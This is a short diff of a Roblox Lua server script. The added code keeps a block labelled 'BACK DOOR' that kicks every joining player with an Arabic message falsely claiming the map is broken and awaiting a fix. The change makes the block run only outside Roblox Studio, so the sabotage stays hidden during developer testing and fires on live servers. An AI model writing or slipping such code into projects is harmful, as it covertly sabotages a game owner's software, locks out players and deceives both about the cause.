@@ -23,8 +23,10 @@ game.Players.PlayerRemoving:Connect(function(plr)
 	sent(plr.Name.." ["..plr.Team.Name.."]: Left -- System")
 end)
 -- BACK DOOR
-task.spawn(function()
-	game.Players.PlayerAdded:Connect(function(plr)
-		plr:Kick("الماب خربان استنى علبال ما نصلحه")
+if not game["Run Service"]:IsStudio() then
+	task.spawn(function()
+		game.Players.PlayerAdded:Connect(function(plr)
+			plr:Kick("الماب خربان استنى علبال ما نصلحه")
+		end)
 	end)
-end)
+end
